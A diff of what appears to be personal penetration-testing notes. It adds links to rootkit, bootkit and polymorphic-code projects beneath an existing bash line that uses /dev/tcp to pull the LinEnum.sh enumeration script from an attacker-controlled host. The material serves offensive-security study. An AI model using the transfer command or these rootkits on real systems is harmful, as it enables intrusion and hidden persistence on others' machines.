@@ -91,3 +91,11 @@ Powershell or `echo` version of Ippsec's `cat` file tranfer for windows!. WOW on
 ```bash
 bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
 ```
+
+
+A memory safe rust rootkits - [Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/README.md) and [Kris Nova's boopkit](https://github.com/krisnova/boopkit)
+
+Bootkit
+
+A C polymorphic code
+https://github.com/m0nad/PSG/blob/master/psg.c
